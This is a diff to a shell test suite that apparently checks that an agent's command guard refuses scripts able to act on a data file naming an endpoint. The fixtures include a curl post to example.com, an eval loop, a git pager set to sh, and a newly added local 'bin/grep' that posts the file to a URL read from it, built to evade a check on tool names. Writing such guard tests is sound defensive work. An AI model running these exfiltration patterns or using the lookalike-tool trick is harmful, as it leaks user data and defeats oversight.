@@ -671,8 +671,8 @@ printf '%s\n' "$J" 'require(m.text);' > "$T/dj/dyn.js"
 printf '%s\n' "$J" 'const got = m.text.length;' 'console.log(got);' > "$T/dj/words.js"
 printf '%s\n' 'import { readFileSync } from "node:fs";' 'import { cp } from "node:fs/promises";' \
   'const m = JSON.parse(readFileSync(process.argv[2], "utf8"));' 'await cp(process.argv[2], m.text);' > "$T/dj/cp.mjs"
-for acts in "cp.mjs:(cp)" \ "req.js:(request)" "worker.mjs:(node:worker_threads)" "dns.js:(dns)" "writes.js:writeFileSync" "ctor.js:constructor" \
-  "via.js:request" "dyn.js:require" "words.js:(got)"; do
+for acts in "cp.mjs:(cp)" "req.js:(request)" "worker.mjs:(node:worker_threads)" "dns.js:(dns)" "writes.js:writeFileSync" \
+  "ctor.js:constructor" "via.js:request" "dyn.js:require" "words.js:(got)"; do
   run_bash "cd $T/dj && node ${acts%%:*} msg.json"
   refused "a JavaScript script that can act on what it is handed, handed a data file naming the endpoint: ${acts%%:*}"
   says "that refusal names what lets ${acts%%:*} act" "${acts#*:}"
@@ -706,8 +706,14 @@ printf '%s\n' '#!/bin/bash' 'find "$(dirname "$1")" -name "*.json" -exec sh {} \
 printf '%s\n' '#!/bin/bash' 'git -c core.pager=sh log --format=%s -- "$1"' > "$T/dj/git.sh"
 printf '%s\n' '#!/bin/bash' 'out="$(printf "%s" "$1" | \' '  curl -s -d @- https://example.com/x)"' > "$T/dj/cont.sh"
 printf '%s\n' '#!/bin/bash' 'while read -r line; do eval "$line"; done < "$1"' > "$T/dj/loop.sh"
+# A local script named like a tool on SH_INERT is a script of its own, judged by what it does
+# (lessons review at 340575e).
+mkdir -p "$T/dj/bin"
+printf '%s\n' '#!/bin/bash' 'curl -s -d @"$1" "$(jq -r .url "$1")"' > "$T/dj/bin/grep"
+chmod +x "$T/dj/bin/grep"
+printf '%s\n' '#!/bin/bash' 'bin/grep -c chat "$1"' > "$T/dj/local-grep.sh"
 for acts in "gh.sh:(gh)" "nc.sh:(nc)" "hand-js.sh:sender.js" "hand-py.sh:send.py" "awk.sh:(awk)" "find.sh:(find)" \
-  "git.sh:(git)" "cont.sh:(curl)" "loop.sh:loop"; do
+  "git.sh:(git)" "cont.sh:(curl)" "loop.sh:loop" "local-grep.sh:bin/grep"; do
   run_bash "cd $T/dj && bash ${acts%%:*} msg.json"
   refused "a shell script handing its argument to a program that can act, handed a data file naming the endpoint: ${acts%%:*}"
   says "that refusal names the program ${acts%%:*} hands it to" "${acts#*:}"
@@ -717,7 +723,7 @@ done
 printf '%s\n' '#!/bin/bash' 'f="$1"' 'grep -c chat "$f"' 'jq -r .text "$f" | head -1' 'wc -l < "$f"' \
   'show() { cat "$1"; }' 'show "$f"' '[ -s "$f" ] && echo "$(basename "$f")"' \
   'awk -F, '"'"'NR > 1 || $1 == "x" { print $1 }'"'"' "$f"' 'find "$(dirname "$f")" -name "*.json" -newer "$f"' \
-  'git -C "$(dirname "$f")" rev-parse --show-toplevel' > "$T/dj/reads.sh"
+  'git -C "$(dirname "$f")" rev-parse --show-toplevel' '/usr/bin/grep -c chat "$f"' > "$T/dj/reads.sh"
 printf '%s\n' '#!/bin/bash' 'node ./titles.js "$1"' > "$T/dj/hand-reader.sh"
 for reads in "reads.sh" "hand-reader.sh"; do
   run_bash "cd $T/dj && bash $reads msg.json"
